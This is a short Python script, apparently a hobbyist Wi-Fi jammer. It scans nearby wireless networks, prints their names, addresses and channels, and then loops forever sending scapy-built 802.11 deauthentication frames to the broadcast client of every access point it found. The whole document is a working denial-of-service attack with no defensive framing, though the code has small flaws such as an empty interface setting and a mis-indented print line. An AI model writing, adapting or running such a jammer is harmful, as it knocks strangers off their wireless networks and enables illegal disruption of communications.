#ifconfig wlan1 down
#iwconfig wlan1 mode monitor
#iwconfig - to change mode from managed to monitored

import wireless
from wifi import Cell
from scapy.all import *

wifi1 = wireless.Wireless()
interface = wifi1.interface()

all_wifi_networks = Cell.all(interface)
bssids = []

for wifi in all_wifi_networks:
   print "Network Name : " + wifi.ssid
   print "Network Address : " + wifi.address
   print "Network Channel : " + str(wifi.channel)
   print "Network Quality : " + str(wifi.quality)
   bssids.append(wifi.address)

def jam(address):
   conf.iface = ""  # the interface in monitor mode
   bssid = address
   client = "FF:FF:FF:FF:FF:FF" #broadcast
   count = 3
   conf.verb = 0
   packet = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
   for n in range(int(count)):
      sendp(packet)
         print 'Deauth num '+ str(n) + ' sent via: ' + conf.iface + ' to BSSID: ' + bssid + ' for Client: ' + client

while True:
   for bssid in bssids:
      print "Jamming on : {0}".format(bssid)
      jam(bssid)
